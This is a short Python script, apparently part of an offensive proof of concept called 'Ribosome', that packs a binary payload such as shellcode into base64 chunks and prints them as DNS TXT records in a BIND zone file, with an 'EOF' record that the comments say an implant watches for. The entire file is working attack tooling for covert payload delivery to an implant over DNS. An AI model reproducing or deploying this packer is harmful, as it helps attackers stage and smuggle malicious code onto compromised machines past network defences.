#!/usr/bin/env python3
import sys
import base64
import argparse

def chunk_string(string, length):
    return (string[0+i:length+i] for i in range(0, len(string), length))

def pack_payload(input_file, domain, chunk_size=200):
    try:
        with open(input_file, 'rb') as f:
            data = f.read()
    except Exception as e:
        print(f"[-] Error reading {input_file}: {e}")
        sys.exit(1)

    # Encode the binary payload to base64 so it can safely travel in a TXT record
    b64_payload = base64.b64encode(data).decode('utf-8')
    chunks = list(chunk_string(b64_payload, chunk_size))
    
    print(f";;; BIND Zone File for Ribosome-PoC tRNA Delivery ;;;")
    print(f";;; Payload Size: {len(data)} bytes (encoded: {len(b64_payload)} bytes) ;;;")
    print(f";;; Total Chunks: {len(chunks)} ;;;")
    print(f"$ORIGIN {domain}.\n")
    
    for i, chunk in enumerate(chunks):
        # Format: <sequence_id> IN TXT "chunk_data"
        print(f"{i:<8} IN  TXT \"{chunk}\"")
        
    # The Ribosome implant looks for the 'EOF' string to know when to stop fetching
    print(f"{len(chunks):<8} IN  TXT \"EOF\"")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="tRNA Payload Packer (DNS TXT Steganography)")
    parser.add_argument('-i', '--input', required=True, help="Input binary to pack (e.g., shellcode.bin)")
    parser.add_argument('-d', '--domain', required=True, help="Base domain for the zone (e.g., payload.test.local)")
    parser.add_argument('-c', '--chunk-size', type=int, default=200, help="Max chars per TXT record (default: 200)")

    args = parser.parse_args()
    pack_payload(args.input, args.domain, args.chunk_size)
